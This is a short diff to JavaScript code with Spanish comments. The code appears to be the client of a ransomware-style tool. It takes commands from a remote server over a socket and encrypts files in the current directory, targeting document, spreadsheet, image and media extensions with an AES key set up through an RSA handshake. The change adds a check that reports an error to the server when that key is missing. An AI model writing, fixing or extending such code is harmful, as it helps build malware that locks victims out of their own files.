@@ -1087,6 +1087,20 @@ async function conectar() {
         const { comandoId, limite } = data;
         console.log(` Iniciando cifrado de archivos objetivo (limite: ${limite || 100})...`);
 
+        // VERIFICAR que la clave AES esté disponible
+        if (!claveAES) {
+            console.error(' [!] ERROR: claveAES es null - El handshake RSA no se completó');
+            socket.emit('cifrado-completado', {
+                comandoId,
+                clienteId: socket.id,
+                totalCifrados: 0,
+                totalErrores: 0,
+                error: 'Clave AES no disponible - reiniciar cliente',
+                resumenBasico: { totalCifrados: 0, totalErrores: 0 }
+            });
+            return;
+        }
+
         // Escanear el directorio donde se ejecuto el script (CWD)
         const directorios = [process.cwd()];
         const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
